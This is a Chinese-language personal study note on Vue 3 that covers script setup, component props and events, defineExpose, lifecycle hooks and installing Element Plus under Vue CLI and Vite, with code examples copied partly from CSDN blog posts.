例子2

```vue
<template>
  <div class="home">
    值：{{flag }}
    <button @click="change">修改值</button>
  </div>
</template>
 
<!-- 只需要在script上添加setup -->
<script lang="ts" setup>
    import { ref } from 'vue';
    <!-- flag变量不需要在 return出去了 -->
    let flag=ref("啦啊啦啦啦啦")
    <!-- 函数也可以直接引用,不用在return中返回 -->
    let change=() => {
        flag.value='略略略略略略略略'
    }
</script>
```

参考：

- [sfc-script-setup](https://github.com/vuejs/rfcs/blob/sfc-improvements/active-rfcs/0000-sfc-script-setup.md)
- [New script setup and ref sugar](https://github.com/vuejs/rfcs/pull/222)
- [New `script setup` (without ref sugar)](https://github.com/vuejs/rfcs/pull/227)

### 三、组件自动注册

在 script setup 中，引入的组件可以直接使用

+ 无需再通过components进行注册，并且无法指定当前组件的名字，它会自动以文件名为主

+ 不用再写name属性

例子1

```vue
<template>
  <div class="home">
    <test-com></test-com>
  </div>
</template>
 
<script lang="ts" setup>
 
// 组件命名采用的是大驼峰，引入后不需要在注册
// 在使用的使用直接是小写和横杠的方式连接 test-com
import TestCom from "../components/TestCom.vue"    // 一般情况不加{}
 
</script>
```

例子2

```html
<script setup>
import MyComponent from './MyComponent.vue'
</script>

<template>
  <MyComponent />
</template>
```

### 四、传参

**defineProps** 用来接收父组件传来的 props ; **defineEmits** 用来声明触发的事件

+ <strong style="color:red">父组件 ===> 子组件</strong>   defineProps()
+ **<strong style="color:red">子组件 ===> 父组件</strong>**  defineEmits()
+ 子组件通过 defineProps 接收父组件传过来的数据
+ 子组件通过 defineEmits 定义事件发送信息给父组件
+ 父传参:  `@`或`:`参数传递
+ 子传参 emit
+ 父接受参数  @参数=方法   , 注意: 参数和方法一般设置成同名的
+ 子接受参数   defineProps
+ ![image-20231208215629688](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231208215629688.png)

#### 例子1

<strong style="color:red">父组件 ===> 子组件</strong>   defineProps

 **父组件传递参数：**

```javascript
<template>
  <div class="box">
    <test-com :info="msg" time="42分钟"></test-com>       //父传参:  `@`或`:`参数传递
  </div>
</template>
 
<script lang="ts" setup>
    import TestCom from "../components/TestCom.vue"
    
	let msg='今天是2023年3月14日'
</script>
```

**子组件接受参数：**

```javascript
<template>
    <div>
        <h2> 啦啦啦啦啦啦啦啦</h2>
        <p>信息: {{ info}}</p>
        <p> {{ time }}</p>
    </div>
</template>
 
<script lang="ts" setup>
 
import {defineProps} from 'vue'
 
defineProps({                     //子接受参数   defineProps
    info:{
        type:String,
        default:'----'
    },
    time:{
        type:String,
        default:'0分钟'
    },
})
 
</script>
```

父组件同样使用`@`或`:`参数  传递。

#### 例子2

**<strong style="color:red">子组件 ===> 父组件</strong>**  defineEmits

子组件`CompA.vue`

```html
<template>
  <div>{{msg}}</div>
  <button @click="func">func</button>
</template>

<script setup>
defineProps({
  msg: String
})

const emit = defineEmits(['func'])   //子传参 emit

// 不用有箭头函数
function func() { 
  emit('func', 'func called')
}
</script>
```

父组件`App.vue`

```html
<template>
	<CompA msg="hello" @func='fun'></CompA>  //父接受参数  @参数=方法   , 注意: 参数和方法不重名
</template>

<script setup>
    import CompA from './components/Comp-A.vue'

    function fun(text) {
      console.log(text)
    }
</script>
```

父组件同样使用`@`或`v-on:`接收。

#### 例子3

**<strong style="color:red">父组件 <===> 子组件</strong>**  两者结合

父组件

```javascript
//父组件
<template>
    //监听子组件的getChild方法，传msg给子组件
    <Child @getChild="getchild" :title="msg" />
</template>
 
<script setup>
    import { ref } from 'vue'
    import Child from '@/components/Child.vue'

    const msg = ref('parent value')
    const getchild = (e) => {
        // 接收父组件传递过来的数据
        console.log(e); // child value
    }
</script>
```

 子组件

```javascript
//子组件
<template>
    <div @click="toEmits">Child Components</div>
</template>
 
<script setup>
// defineEmits,defineProps无需导入，直接使用
const emits = defineEmits(['getChild']);
//接收父组件传来的props
const props = defineProps({
    title: {
        type: String,
        defaule: 'defaule title'
    }
});

const toEmits = () => {
    // 向父组件抛出带参事件getChild（其中参数是child value）
    emits('getChild', 'child value') 
}
// 获取父组件传递过来的数据
console.log(props.title); // parent value
</script>
```

- 子组件通过 defineProps 接收父组件传过来的数据
- 子组件通过 defineEmits 定义事件发送信息给父组件

### 五、useSlots()和 useAttrs()

获取 slots 和 attrs

1. `useAttrs`：这是用来获取 attrs 数据，但是这和 vue2 不同，里面包含了 `class`、`属性`、`方法`。

```javascript
<template>
    <component v-bind='attrs'></component>
</template>
<srcipt setup lang='ts'>
   const attrs = useAttrs();
<script>
```

1. `useSlots`: 顾名思义，获取插槽数据。

使用示例：

```javascript
// 旧
<script setup>
  import { useContext } from 'vue'
  const { slots, attrs } = useContext()
</script>
 
// 新
<script setup>
  import { useAttrs, useSlots } from 'vue'
  const attrs = useAttrs()
  const slots = useSlots()
</script>
```

------

### 六、defineExpose API

defineExpose ----> [组件暴露出自己的属性]

传统的写法，我们可以在父组件中，通过 ref 实例的方式去访问子组件的内容，但在 script setup 中，该方法就不能用了，setup 相当于是一个闭包，除了内部的 `template`模板，谁都不能访问内部的数据和方法。

> <script setup> 的组件默认不会对外部暴露任何内部声明的属性。
>
> 如果有部分属性要暴露出去，可以使用 `defineExpose`

如果需要对外暴露 setup 中的数据和方法，需要使用 defineExpose API。

tip:// defineExpose无需导入，直接使用

**示例**：

子组件

```javascript
//子组件
<template>
    {{msg}}
</template>
 
<script setup>
import { ref } from 'vue'
let msg = ref("Child Components");
let num = ref(123);
defineExpose({
    msg,
    num
});
</script>
```

父组件

```javascript
//父组件
<template>
    <Child ref="child" />
</template>
 
<script setup>
import { ref, onMounted } from 'vue'
import Child from '@/components/Child.vue'
let child = ref(null);
onMounted(() => {
    console.log(child.value.msg); // Child Components
    console.log(child.value.num); // 123
})
</script>
```

------

### 七、 新增指令 v-memo

`v-memod`会记住一个模板的子树，元素和组件上都可以使用。

该指令接收一个固定长度的数组作为依赖值进行“记忆比对”。如果数组中的每个值都和上次渲染的时候相同，则整个子树的更新会被跳过。

即使是虚拟 DOM 的 VNode 创建也将被跳过，因为子树的记忆副本可以被重用。

**因此渲染的速度会非常的快。**

tip:正确地声明记忆数组是很重要。

开发者有责任指定正确的依赖数组，以避免必要的更新被跳过。

```javascript
<li v-for="item in listArr"  :key="item.id"  v-memo="['valueA'，'valueB']">
    {{ item.name   }}
</li>
```

`v-memod`的指令使用较少，它的作用是：缓存模板中的一部分数据。

只创建一次，以后就不会再更新了。也就是说用内存换取时间。

------

### 八、style v-bind

**`例：style v-bind`将`span`变成红色**

```javascript
<template>
  <span> 啦啦啦啦啦啦啦啦啦啦 </span>  
</template>
 
<script setup>
  import { reactive } from 'vue'
  const state = reactive({
    color: 'red'
  })
</script>
<style scoped>
  span {
    /* 使用v-bind绑定state中的变量 */
    color: v-bind('state.color');
  }  
</style>
```

------

### 九、定义组件其他配置

配置项的缺失，有时候我们需要更改组件选项，在`setup`中我们目前是无法做到的。我们需要在`上方`再引入一个 `script`，在上方写入对应的 `export`即可，需要单开一个 script。

<script setup> 可以和普通的 <script> 一起使用。

普通的 `<script>` 在有这些需要的情况下或许会被使用到：

- 无法在 `<script setup>` 声明的选项，例如 `inheritAttrs` 或通过插件启用的自定义的选项。
- 声明命名导出。
- 运行副作用或者创建只需要执行一次的对象。

在script setup 外使用export default，其内容会被处理后放入原组件声明字段。

```javascript
<script>
// 普通 `<script>`, 在模块范围下执行(只执行一次)
runSideEffectOnce()
// 声明额外的选项
  export default {
    name: "MyComponent",
    inheritAttrs: false,
    customOptions: {}
  }
</script>
<script setup>
    import HelloWorld from '../components/HelloWorld.vue'
    // 在 setup() 作用域中执行 (对每个实例皆如此)
    
</script>
<template>
  <div>
    <HelloWorld msg="Vue3 + TypeScript + Vite"/>
  </div>
</template>
```

### 十、生命周期钩子函数

这里主要讲常用的6个[钩子函数](https://so.csdn.net/so/search?q=钩子函数&spm=1001.2101.3001.7020)：onBeforeMount, onMounted, onBeforeUpdate, onUpdated，onBeforeUnmount, onUnmounted

其中onBeforeUnmount, onUnmounted需要引用组件来实现调用，在子组件里面添加，在父组件中使用v-if控制这个子组件的显示和消失，就可以了。

子组件代码：

```vue
<template>
<div>
这是关于页面的内容
</div>
</template>
 
<script setup lang='ts'>
import {onBeforeUnmount, onUnmounted } from 'vue'
    
// 组件销毁之前
onBeforeUnmount(() => {
  console.log("组件销毁之前");
})
 
// 组件销毁之后
onUnmounted(() => {
  console.log("组件销毁之后");
})
    
</script>
 
<style scoped>
 
</style>
```

父组件代码：

```vue
<template>
<div>
  <h2>Vue3的生命周期</h2>
  <div>
    <button @click="updateContent">点击更改组件内容</button>
    <button @click="show">创建和销毁组件</button>
    <div ref="demo">{{ content }}</div>
    <AboutMe v-if="display" ></AboutMe>
  </div>
</div>
</template>
 
<script setup lang='ts'>
import { ref, onBeforeMount, onMounted, onBeforeUpdate, onUpdated } from 'vue'
// import AboutMe from './views/AboutMe.vue'
import AboutMe from './views/AboutMe.vue'
 
console.log("setup语法糖模式中，可以直接在这里当做created函数使用");
 
const demo = ref<HTMLDivElement>()
 
const content = ref<string>("这是内容：div内容")
 
const display = ref<boolean>(true)
 
const updateContent = ()=>{
  content.value = "div组价内容更新"
}
 
const show = ()=>{
  display.value = !display.value
}
 
// 页面渲染之前
onBeforeMount(() => {
  console.log("渲染之前", demo);
})
 
// 页面渲染之后
onMounted(() => {
  console.log("渲染之后", demo);
})
 
// 组件更新之前
onBeforeUpdate(() => {
  console.log("组件更新之前", demo);
})
 
// 组件更新之后
onUpdated(() => {
  console.log("组件更新之后", demo);
})
 
</script>
 
<style scoped>
 
</style>
```



# $ref语法糖

为了避免在使用ref的时候，需要通过`.value`调用，vue3提供了`$ref`语法糖。

要开启`$ref`语法糖，需要先在`vite.config.js`中配置：

```javascript
import { defineConfig } from 'vite'
import vue from '@vitejs/plugin-vue'

export default defineConfig({
  plugins: [
    vue({
      reactivityTransform: true,
      refSugar:true
    })
  ]
})
```

然后在vue中直接使用即可：

```html
<script setup>
import { watchEffect } from 'vue'

let count = $ref(1)

watchEffect(() => console.log(count))

function inc() {
  count++
}
</script>

<template>
<div>{{count}}</div>
<button @click="inc">increase</button>
</template>
```

参考：[Reactivity Transform](https://github.com/vuejs/rfcs/discussions/369)

---


在较早的版本中（**目前已弃用**），可以使用 `ref:`创建。<br />ref语法糖是一个引起热议的试验性特性，因为其违反了JavaScript语法规则，必须借助编译器实现解析。

```vue
<template>
<div>{{count}}</div>
<button @click="inc">增加</button>
<button @click="dec">减少</button>
</template>

<script setup>
ref: count = 0
const inc = () => { count++ }
const dec = () => { count-- }
</script>
```

参考：

- [New script setup and ref sugar](https://github.com/vuejs/rfcs/pull/222)
- [Ref sugar](https://github.com/vuejs/rfcs/pull/228)

<a name="qpxTU"></a>

## 顶层await

可以直接在script setup中使用await，相当于创建了一个 `async setup()`。<br />示例：

```html
<script setup>
let res = await fetch('http://localhost:3000/')
console.log(await res.text())
</script>

```

### `defineProps`和`defineEmits`

要接收值，需要使用`defineProps`；需要传递值，需要使用`defineEmits`

示例：子组件`CompA.vue`

```html
<script setup>
defineProps({
  msg: String
})

const emit = defineEmits(['func'])

function func() {
  emit('func', 'func called')
}
</script>

<template>
  <div>{{msg}}</div>
  <button @click="func">func</button>
</template>
```

父组件`App.vue`

```html
<script setup>
import CompA from './components/Comp-A.vue'

function fun(text) {
  console.log(text)
}
</script>

<template>
<CompA msg="hello" @func='fun'></CompA>
</template>
```

上面的示例：从父组件传递一个msg的参数到子组件，子组件通过`defineProps`接收，相当于optional API的`props`选项；子组件通过 `defineEmits` 定义emit，组件中有一个按钮，点击的时候，通过`emit`定义自定义事件并传出数据，父组件同样使用`@`或`v-on:`接收。

<a name="YO4cb"></a>

### 组件ref

通过引入组件的方式获取组件ref，默认是不会暴露任何声明的数据的，需要使用`defineExpose`暴露属性或方法。

示例：<br />子组件`CompA.vue`

```html
<script setup>
function func() {
  console.log('func called')
}

const a = 1
const b = ref(2)

defineExpose({
  a,
  b,
  func
})
</script>
```

父组件`App.vue`

```html
<script setup>
import CompA from './components/Comp-A.vue'
import { onMounted } from 'vue'

const compA = $ref(null)
onMounted(() => {
  // 在渲染完成后，才能获取到此组件对象
  console.log(compA)
})
</script>

<template>
	<CompA ref='compA'></CompA>
</template>
```

除了使用组件ref外，通过`$parent`获取也是同样的操作。

<a name="KZps0"></a>

## 自定义指令

自定义指令，必须按`vNameOfDirective`的格式创建。

示例：

```html
<script setup>
let count = $ref(0)

function inc() {
  count++
}

const vClickDirective = {
  mounted: (el) => {
    el.click()
  }
}
</script>

<template>
  <div>{{count}}</div>
  <button @click="inc" v-click-directive>increase</button>
</template>
```



## 第三方组件element-ui

```
npm install element-plus --save
```

![image-20231123110217653](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231123110217653.png)



# vuecli vue3引入Element-plus

代码见: [3testelement](C:\Users\16658\Documents\GitHub\java_note\5-前端\vue\code\3testelement)

[element-ui](https://so.csdn.net/so/search?q=element-ui&spm=1001.2101.3001.7020)是vuecli2版本，与vuecli3版本不兼容，故vuecli3则是使用element-plus。想要将element-plus引入到项目中去，有以下方法：

**vuecli3引入**

[Element-plus](https://so.csdn.net/so/search?q=Element-plus&spm=1001.2101.3001.7020)

- [一、下载安装element-plus依赖包到项目中去](https://blog.csdn.net/qq_45438471/article/details/129478396#elementplus_5)
- [二、导入（组件和组件样式）](https://blog.csdn.net/qq_45438471/article/details/129478396#_8)
- - [1、全手动导入（不推荐：手动导入组件，手动导入组件样式）](https://blog.csdn.net/qq_45438471/article/details/129478396#1_9)
  - [2、半自动导入（推荐：手动导入组件，自动导入组件样式）](https://blog.csdn.net/qq_45438471/article/details/129478396#2_57)
  - [3、全自动导入组件和样式（推荐）](https://blog.csdn.net/qq_45438471/article/details/129478396#3_142)
- [三、测试](https://blog.csdn.net/qq_45438471/article/details/129478396#_255)

[elementPLUS的官网](https://element-plus.org/zh-CN/component/),注意不要与elementUI官网搞混,  elementPLUS和elementUI的部分组件名有区别。

## 一、下载安装element-plus依赖包

下载安装element-plus依赖包到项目中去

```
npm i -D element-plus
```

## 二、导入（组件和组件样式）

### 1、全手动导入（不推荐：手动导入组件，手动导入组件样式）

（1）在组件中手动导入组件和组件样式

```html
<template>
	<div>
		<el-button @click="summit"><el-button>
	</div>
</template>
<script setup>
import { ElMessage } from 'element-plus'
import 'element-plus/es/components/message/style/css'
const summit = () => {
	Elmessage.warning('warning')
}
</script>

12345678910111213
```

（2）在main.js中全局注册

- 1.插件式全局注册
    在vue的机制中，**组件间是不能互相直接使用**，需要手动导入组件及其样式。而使用app.use()是将插件全局注册，之后在其他组件中可以直接使用，无需再手动导入。

```javascript
import { createApp } from 'vue'

// 导入elemen-plus全部组件
import ElementPlus from 'element-plus'
// 导入element-plus全部组件样式
import 'element-plus/dist/index.css'

const app = createApp()
// 全局注册插件
app.use(ElementPlus)
app.mount("#app")
```

- 2.组件式全局注册
    与app.use()不同的是，使用app.component()是将组件全局注册，在其他组件中也可以直接使用。

```javascript
import { createApp } from 'vue'

import { ElButton } from 'element-plus'
import 'element-plus/es/components/button/style/css'

const app = createApp()
app.component(ElButton)
app.mount("#app")
```

  你会发现无论是（1）（2）还是（3），操作都很麻烦，当项目一大就会很混乱，所以不推荐这个方法。

### 2、半自动导入（推荐：手动导入组件，自动导入组件样式）

首先你需要安装unplugin-element-plus插件，帮助我们导入所需组件的样式。

```js
npm install -D unplugin-element-plus 
```

  **补充： unplugin-element-plus插件的主要功能如下：**

> import { ElButton } from ‘element-plus’
>
>     ↓ ↓ ↓ ↓ ↓ ↓↓ ↓ ↓ ↓
>
> import { ElButton } from ‘element-plus’
> import ‘element-plus/es/components/button/style/css’

  然后配置vue.config.js文件。

```javascript
// 直接复制到vue.config.js中去就可以了
const { defineConfig } = require('@vue/cli-service')

const ElementPlus = require('unplugin-element-plus/webpack')

module.exports = defineConfig({
  transpileDependencies: true,
  configureWebpack: {
  	plugins: [
  		ElementPlus({
  			libs: [{
  				libraryName: 'element-plus',
                esModule: true,
                resolveStyle: (name) => {
                	return `element-plus/theme-chalk/${name}.css`
                }
  			}]
  		})
  	]
  }
})

12345678910111213141516171819202122
```

  为了方便管理，将所需组件封装起来，再统一注册。在components文件下新建一个ElementPLUS.js文件。

```javascript
import { 
	ElButton,
	ElTable,
	ElAlert,
	ElAside,
	ElAutocomplete,
	ElAvatar,
	ElBacktop,
	ElBadge
} from 'element-plus'

const cpns = [
  ElButton,
  ElTable,
  ElAlert,
  ElAside,
  ElAutocomplete,
  ElAvatar,
  ElBacktop,
  ElBadge
]

// 将组件结合暴露出去
export default cpn
123456789101112131415161718192021222324
```

  在main.js文件中将组件全局注册、（局部导入请参考上面）

```javascript
import { createApp } from 'vue';
// 将封装起来的组件集合导入，并逐个全局注册
import cpn from './components/ElementPLUS.js'
import router from './router'

const app = createApp(App),
app.use(router)
for (const c of cpn) {
	// vue使用component函数全局注册组件，use函数全局注册插件
	app.component(c.name, c)
}
app.mount('#app')
```

  当所需组件很多的时候，半自动导入的弊端就会暴露出来，就是麻烦。但是还是需要学一学这种方。

### 3、全自动导入组件和样式（推荐）

首先在2的基础上，你还需要安装 [unplugin-vue-components](https://www.npmjs.com/package/unplugin-vue-components) 和 unplugin-auto-import这两款插件

```
npm install -D unplugin-vue-components unplugin-auto-import
```

> - unplugin-auto-import插件可以`自动根据代码上下文来确定导入哪些模块`，比如函数、常量等，而不需要额外的配置。
> - unplugin-vue-components插件在我的理解，就是可以根据需要自动导入Vue组件及其样式。
> - 再加上unplugin-element-plus插件帮助我们导入所需组件的样式，三者相辅相成，让我们无需再显式地导入和注册组件及其样式。解放双手啦~~~

```javascript
// 直接复制到vue.config.js中去就可以了
const { defineConfig } = require('@vue/cli-service')

const ElementPlus = require('unplugin-element-plus/webpack')
const AutoImport = require('unplugin-auto-import/webpack')
const Components = require('unplugin-vue-components/webpack')
/*
{键名：值}是将对象解构，只有键名匹配才能解构，否则失败
unplugin-vue-components支持多种组件库，需要其中的ElementPlus组件库，所以将其解构，然后配置。
若需要Ant Design Vue，则
const { AntDesignVueResolver } = require('unplugin-vue-components/resolvers')，然后配置。
重申以下，不配置自动导入失效，因为无法检索到所需组件在哪个组件库中
*/
const { ElementPlusResolver } = require('unplugin-vue-components/resolvers')

module.exports = defineConfig({
  transpileDependencies: true,
  configureWebpack: {
  	plugins: [
  		/**
  		ElementPlus({
  			libs: [{
  				libraryName: 'element-plus',
                esModule: true,
                resolveStyle: (name) => {
                	return `element-plus/theme-chalk/${name}.css`
                }
  			}]
  		}),**/
  		AutoImport({
        	resolvers: [
        		ElementPlusResolver(),
        		// AntDesignVueResolver()
        	],
      	}),
      	Components({
        	resolvers: [
        		// 需要ElementPus组件库，所以配置ElementPlus组件库
        		ElementPlusResolver(),
        		// AntDesignVueResolver()
        	],
      	})
  	]
  }
})
```

- 若全自动导入组件和样式，其实连下载element-plus安装包和unplugin-element-plus插件到项目中去这两步操作都可以省去。只需要下载安装unplugin-vue-components和unplugin-auto-import这两个插件就可以了。
- （unplugin-vue-components和unplugin-element-plus）或者（unplugin-auto-import和unplugin-element-plus）这两个搭配在遇到`el组件创建el组件时都会出错`，只有unplugin-vue-components和unplugin-auto-import搭配使用才正确。所以**unplugin-element-plus在三者中可有可无**。

## 三、测试

  在App.vue中添加几个element-ui看是否成功

```javascript
<template>
  	<el-button>Default</el-button>
    <el-button type="primary">Primary</el-button>
    <el-button type="success">Success</el-button>
    <el-button type="info">Info</el-button>
    <el-button type="warning">Warning</el-button>
    <el-button type="danger">Danger</el-button>
</template>
```

![img](vue%E7%AC%94%E8%AE%B02.0.assets/%25P(W)YSQT2A5%25NZ%5D%5B%7B3YM5.png)

# vite vue3引入Element-plus

具体方法直接见官网

具体代码见:  [3viteelement](C:\Users\16658\Documents\GitHub\java_note\5-前端\vue\code\3viteelement)

[教程2 Vue3中引入Element Plus_vue3引入](https://blog.csdn.net/boxuestudio/article/details/128916186)

要求:

+ node.js   > V18

+ vite  > V3

**（1）引入Element开发环境**

```shell
npm install element-plus --save 
npm i -D unplugin-auto-import
npm i -D unplugin-vue-components
```

**（2）自动引入Element**

```shell
npm install -D unplugin-vue-components unplugin-auto-import
```

 **（3）在配置文件中进行配置，本人使用的是Vit构建工具**

如果使用Vite作为构建工具，配置文件为vite.config.js，配置方法如下：

```js
import { fileURLToPath, URL } from "node:url";
import { defineConfig } from "vite";
import vue from "@vitejs/plugin-vue";

import AutoImport from 'unplugin-auto-import/vite';
import Components from 'unplugin-vue-components/vite';
import { ElementPlusResolver } from 'unplugin-vue-components/resolvers';

export default defineConfig({
  plugins: [
    vue(),
    AutoImport({
      resolvers: [ElementPlusResolver()],
    }),
    Components({
      resolvers: [ElementPlusResolver()],
    }),
  ],

  resolve: {
    alias: {
      "@": fileURLToPath(new URL("./src", import.meta.url)),
    },
  },

  server: {
    port: 8080,
  },
});
```

 **Element Plus图标全局引入【推荐】**

```shell
# 图标
npm install @element-plus/icons-vue  
```

main.js中增加下面的代码：

```js
import { createApp } from "vue";
import App from "./App.vue";
import * as ElementPlusIconsVue from "@element-plus/icons-vue";

const app = createApp(App);
for (const [key, component] of Object.entries(ElementPlusIconsVue)) {
  app.component(key, component);
}
app.mount("#app");
```

例子

```vue
<template>
  <el-form :model="form" ref="formRef" :rules="rules" label-width="120px">
        <el-form-item label="活动名称:" prop="ActName">
          <el-input v-model="form.ActName" placeholder="请输入活动名称" />
        </el-form-item>
        <el-form-item label="活动分类:" prop="ActCategory">
          <el-select v-model="form.ActCategory" placeholder="请选择活动类型">
            <el-option label="下单奖励红包" value="1" />
          </el-select>
        </el-form-item>
        <el-form-item label="活动有效时间:" prop="time">
          <el-date-picker
            v-model="form.time"
            type="daterange"
            range-separator="至"
            start-placeholder="开始时间"
            end-placeholder="结束时间"
            value-format="YYYY-MM-DD"
          />
        </el-form-item>
        <el-form-item label="活动金额:" prop="TotalAmount">
          <el-input v-model="form.TotalAmount" />
        </el-form-item>
        <el-form-item>
            <el-button type="primary" @click="createClick">创 建</el-button>
        </el-form-item>
      </el-form>
</template>

<script setup>
  import { reactive, ref } from "vue";
  const formRef = ref(null);
  const form = reactive({
    ActName: "",
    ActCategory: "",
    BeginTime: "",
    EndTime: "",
    TotalAmount: "",
    time: [],
  })
  // form表单的校验规则
  const rules = reactive({
    ActName: [{ required: true, message: "请输入活动名称", trigger: "blur" }],
    ActCategory: [
      {
        required: true,
        message: "请选择活动类型",
        trigger: "change",
      },
    ],
    TotalAmount: [
      {
        required: true,
        message: "请输入活动金额",
        trigger: "blur",
      },
    ],
    time: [
      {
        type: "array",
        required: true,
        message: "请选择活动有效时间",
        trigger: "change",
      },
    ],
  });

  // 创建活动事件
  const createClick = () => {
    formRef.value.validate(async (isValid, invalidFields) => {
      if (isValid) {
        console.log(tableData.value);
        if (tableData.value.length === 0) {
          ElMessage({
            message: "配置信息不能为空",
            type: "warning",
          });
          return;
        }
        const params = {
          ActName: form.ActName,
          ActCategory: form.ActCategory,
          BeginTime: form.time[0],
          EndTime: form.time[1],
          TotalAmount: form.TotalAmount,
          ActConfigs: tableData.value,
        };
        const loading = ElLoading.service({
          lock: true,
          text: "Loading",
          background: "Transparent",
        });
        const res = await actCreate(params);
        if (res.result) {
          loading.close();
          ElMessage({
            message: res.msg,
            type: "success",
          });
          formRef.value.resetFields(); //清空表单
        } else {
          loading.close();
          ElMessage.error(res.msg);
        }
      } else {
        console.log("验证不通过,不能提交,请检查");
      }
    });
  };
</script>
```

![image-20231123160157899](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231123160157899.png)



# 路径问题

不带{ }以组件方式 引入后，用 组件名. 变量 的方式一直提示变量未定义的问题，改成直接 带{ }引入变量直接使用变量就不提示错误了，（不知道是不是我引入的包和他人不一样的原因...），

直接记录一下查到的两个区别

**1、import ...与import{ }的区别：**

**import{ }：**带{ }引入的是某个变量，多个变量可以逗号分隔；
**import ...：**不带{ }引入的是组件，可以用.的方式使用组件里的变量

![image-20231123205819408](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231123205819408.png)

**2、import from '@路径' 与 import from '../路径'的区别**

**import from '@路径'**：以根目录的方式定义相对路径，从项目第一级节点开始表示src/
**import from '../路径'**：是以父子目录的方式定义相对路径
                   . /指当前目录

```js
import { fileURLToPath, URL } from "node:url";
import { defineConfig } from "vite";
import vue from "@vitejs/plugin-vue";

import AutoImport from 'unplugin-auto-import/vite';
import Components from 'unplugin-vue-components/vite';
import { ElementPlusResolver } from 'unplugin-vue-components/resolvers';

export default defineConfig({
  plugins: [
    vue(),
    AutoImport({
      resolvers: [ElementPlusResolver()],
    }),
    Components({
      resolvers: [ElementPlusResolver()],
    }),
  ],

  resolve: {
    alias: {
      "@": fileURLToPath(new URL("./src", import.meta.url)),
    },
  },

  server: {
    port: 3000,
  },
});
```

